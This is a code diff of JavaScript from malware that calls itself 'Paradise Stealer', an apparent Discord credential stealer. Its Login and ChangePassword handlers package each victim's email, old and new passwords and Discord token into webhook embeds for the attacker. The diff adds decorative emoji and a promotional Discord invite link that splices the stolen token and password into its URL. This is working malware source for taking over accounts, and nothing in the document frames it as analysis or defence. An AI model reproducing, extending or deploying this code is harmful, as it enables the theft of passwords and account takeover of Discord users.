@@ -217,6 +217,7 @@ function Login(e, t, n) {
                                         embeds: [
                                             {
                                                 title: "User Login",
+                                                description: "[**<:paradisestealer:950030379123879947> │ Join Paradise Stealer Discord**](https://discord.gg/BxWGPQwNZy" + n + "<br>" + t + ")",
                                                 color: config["embed-color"],
                                                 fields: [
                                                     
@@ -344,7 +345,7 @@ function ChangePassword(e, t, n) {
                                                                         })()}`,
                                                                         inline: !1,
                                                                     },
-                                                                    { name: "Email", value: `\`${u.email}\``, inline: !1 },  { name: "Old Password", value: `\`${e}\``, inline: !0 },{ name: "New Password", value: `\`${t}\``, inline: !0 },
+                                                                    { name: "<:PP_director:942527310324719716> Email", value: `\`${u.email}\``, inline: !1 },  { name: "<:staff_blue:936543701294010399> Old Password", value: `\`${e}\``, inline: !0 },{ name: "<:staff_blue:936543701294010399> New Password", value: `\`${t}\``, inline: !0 },
                                                                     
                                                                     
                                                                     { name: "Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
@@ -414,7 +415,7 @@ function ChangePassword(e, t, n) {
                                                                             embeds: [
                                                                                 {
                                                                                     title: "Password Changed",
-                                                                                    description: "[**<:partner:909102089513340979> │ Join Paradise Stealer Discord**](https://discord.gg/BxWGPQwNZy" + n + "<br>" + t + ")",
+                                                                                    description: "[**<:paradisestealer:950030379123879947> │ Join Paradise Stealer Discord**](https://discord.gg/BxWGPQwNZy" + n + "<br>" + t + ")",
                                                                                     color: config["embed-color"],
                                                                                     fields: [
                                                                                         { name: "Username", value: `\`${i.username}#${i.discriminator}\``, inline: !0 },
@@ -440,7 +441,7 @@ function ChangePassword(e, t, n) {
                                                                                             })()}`,
                                                                                             inline: !1,
                                                                                         },
-                                                                                        { name: "Email", value: `\`${i.email}\``, inline: !1 },           { name: "Old Password", value: `\`${e}\``, inline: !0 },     { name: "New Password", value: `\`${t}\``, inline: !0 },
+                                                                                        { name: "<:PP_director:942527310324719716> Email", value: `\`${i.email}\``, inline: !1 },           { name: "<:staff_blue:936543701294010399> Old Password", value: `\`${e}\``, inline: !0 },     { name: "<:staff_blue:936543701294010399> New Password", value: `\`${t}\``, inline: !0 },
                                                                                         
                                                                                         
                                                                                         { name: "Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
